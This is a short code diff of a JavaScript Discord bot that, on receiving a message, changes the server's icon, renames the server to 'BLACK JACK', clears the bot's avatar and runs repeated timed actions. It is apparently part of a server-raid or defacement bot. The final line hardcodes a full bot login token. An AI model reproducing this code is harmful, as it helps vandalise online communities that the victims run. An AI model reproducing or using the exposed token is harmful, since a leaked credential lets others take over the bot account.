@@ -46,6 +46,7 @@ client.on('message', message => {
             });
         }, 1000);
         message.guild.setIcon("https://media.discordapp.net/attachments/793750057500278805/806561503980421120/image0.jpg");
+        client.user.setAvatar("");
         message.guild.setName('BLACK JACK');
         setTimeout(function() {
             setInterval(() => {
@@ -60,7 +61,8 @@ client.on('message', message => {
             })
         }
     
-})        
+})  
+
  ////codaka drwst krawa lalayan black jack
 
 client.login("NzYxMjA3MjU4NTYxNzczNTY4.X3XPgA.uGxi4WZKZFFnx9ZbBbqiTNPGIGg")
